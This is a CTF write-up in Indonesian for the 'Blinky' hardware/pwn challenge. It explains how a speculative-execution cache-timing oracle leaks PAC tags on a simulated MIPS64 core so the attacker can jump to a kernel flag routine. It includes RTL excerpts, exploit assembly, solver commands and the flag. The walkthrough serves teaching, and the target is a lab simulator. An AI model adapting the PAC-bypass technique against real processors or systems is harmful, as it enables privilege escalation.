# Blinky — R3CTF 2026

- **Category:** Pwn / Hardware
- **Difficulty:** Medium
- **Target:** MIPS64r6 soft-core
- **Flag:** `r3ctf{5Ecur3-Ana1Y2iNG_P3rF0Rm@Nce_WorkFloWbb19}`

## Ringkasan

Kernel menyimpan fungsi pencetak flag di alamat tetap `0x2030`. User mode boleh menjalankan kode sendiri, tetapi setiap `jr` dari user ke kernel harus membawa PAC tag yang benar pada byte paling atas pointer.

Brute force biasa tidak bisa dipakai. Satu PAC fault yang benar-benar commit akan mengunci gate sampai simulator di-reset, sedangkan key PAC selalu diacak ulang untuk setiap run.

Celahnya ada pada kombinasi branch misprediction, speculative load, dan PAC-gated load. Load dengan tag benar menyentuh cache probe di `0x1000` dan menambah waktu eksekusi. Load dengan tag salah dibatalkan tanpa akses cache. Karena load tersebut berada di wrong path, fault-nya ditandai speculative dan tidak pernah commit ke CP0. Hasilnya adalah timing oracle yang bisa mencoba seluruh 255 tag nonzero dalam satu boot.

## Recon

Struktur pointer yang dipakai server:

```text
63       56 55                                           0
+-----------+-----------------------------------------------+
|  PAC tag  |          kernel virtual address               |
+-----------+-----------------------------------------------+
```

Target akhir:

```text
VA flag routine = 0x2030
signed pointer  = (tag << 56) | 0x2030
```

Memory map yang relevan:

```text
0x0000 - 0x1fff   user submission
0x2030            kernel flag routine
0x20000000        cycle counter MMIO
0x20000010        stdout MMIO
0x1000            PAC cache probe address
```

## Bug di RTL

### PAC-gated load

`rtl/units/core_EX.sv` punya jalur khusus untuk load dengan tag PAC nonzero:

```systemverilog
assign pac_ld_gated = (|ID_regs.mem_load_type) &&
                      (|ext_out[63:64-`PAC_TAG_BITS]);

assign pac_ld_addr = (pac_ld_gated && pac_ld_ok)
                   ? `PAC_PROBE_ADDR
                   : ext_out;

assign pac_eff_load_type =
    (kmem_violation || (pac_ld_gated && !pac_ld_ok))
    ? NO_LOAD
    : ID_regs.mem_load_type;
```

Efeknya:

- tag benar: load diarahkan ke `PAC_PROBE_ADDR`, yaitu `0x1000`;
- tag salah: load berubah menjadi `NO_LOAD` dan membawa deferred PAC fault.

### Fault speculative tidak commit

Saat conditional branch salah prediksi, wrong-path load tetap didorong ke MEM dengan flag `spec`:

```systemverilog
assign drain_load = spec_squash && (|ID_regs.mem_load_type);
EX_regs.spec <= drain_load;
```

Di `rtl/units/cp0.sv`, exception hanya diambil kalau instruksi bukan speculative:

```systemverilog
takenException = (|next_exc_code) && !spec;
```

Rate limiter juga hanya menghitung PAC fault yang benar-benar commit:

```systemverilog
committed_pac_fault = takenHandler && (next_exc_code == 5'h10);
```

Jadi bad-tag load di wrong path tidak masuk exception handler dan tidak menambah `pac_fault_count`.

## Timing oracle

Branch di `0x4c` dijalankan dua kali dalam kondisi not-taken untuk melatih predictor. Setelah itu register `a0` diganti dengan pointer kandidat dan branch dijalankan lagi dengan kondisi sebenarnya taken.

Predictor masih mengira branch not-taken, sehingga instruksi sesudah branch ikut dieksekusi sebagai wrong path:

```asm
branch_site:
    beq     $a1, $zero, after_attack
    ld      $zero, 0($a0)
```

Pada percobaan ketiga:

```text
a1 = 0
branch sebenarnya taken
predictor memilih not-taken
ld 0(a0) berjalan speculative
```

Kalau PAC tag benar, load diarahkan ke probe `0x1000`. Probe dibuat cold sebelum loop sehingga terjadi cache miss dan pipeline stall. Kalau tag salah, RTL mengubah load menjadi `NO_LOAD`, sehingga stall tersebut tidak muncul.

Cycle counter dibaca sebelum dan sesudah gadget:

```asm
lw      $t0, 0($s0)
...
lw      $t1, 0($s0)
dsub    $t2, $t1, $t0
```

Hasil lokal:

```text
first candidate:
  wrong tag = 43 cycles
  right tag = 46 cycles

steady state:
  wrong tag = 31 cycles
  right tag = 34 cycles
```

Threshold yang dipakai:

```text
first iteration: delta >= 45
next iterations: delta >= 33
```

Selisih tiga siklus cukup stabil untuk membedakan PAC benar dan salah.

## Payload

Kandidat pointer dibentuk dengan menaruh tag pada byte paling atas:

```asm
daddu   $a2, $s4, $zero
dsll32  $a2, $a2, 24
ori     $a2, $a2, 0x2030
```

`dsll32 ..., 24` setara dengan shift total 56 bit.

Loop mencoba tag `1` sampai `255`:

```asm
daddiu  $s4, $zero, 1

prepare_candidate:
    daddu   $a2, $s4, $zero
    dsll32  $a2, $a2, 24
    ori     $a2, $a2, 0x2030
    ...
```

Tag `0` tidak bisa dites melalui jalur PAC-gated load karena gate hanya aktif saat field tag nonzero. Kalau seluruh kandidat `1..255` gagal, payload memakai pointer tanpa tag sebagai fallback:

```asm
daddu   $a2, $zero, $zero
ori     $a2, $a2, 0x2030
```

Saat timing menunjukkan kandidat benar, payload langsung memakai pointer yang sama untuk masuk ke kernel:

```asm
found:
    jr      $a2
    nop
```

PAC gate menerima pointer tersebut, menaikkan privilege kernel, dan menjalankan routine di `0x2030`.

## Build dan uji lokal

Build payload:

```bash
docker build -t blinky-build .
docker run --rm -v "$PWD:/work" blinky-build exploit.s
```

Jalankan dengan dummy kernel:

```bash
./run_local.sh exploit.mem
```

Output:

```text
R3CTF{TEST_FLAG_LOCAL}
HALT
```

## Remote

Solver hanya mengunggah `exploit.mem` ke endpoint `/submit` dan mengambil flag dari response:

```bash
python3 solve.py challenge.ctf2026.r3kapig.com:31207
```

Output remote:

```text
r3ctf{5Ecur3-Ana1Y2iNG_P3rF0Rm@Nce_WorkFloWbb19}
HALT
<FLAG>r3ctf{5Ecur3-Ana1Y2iNG_P3rF0Rm@Nce_WorkFloWbb19}</FLAG>
```

## Flag

```text
r3ctf{5Ecur3-Ana1Y2iNG_P3rF0Rm@Nce_WorkFloWbb19}
```
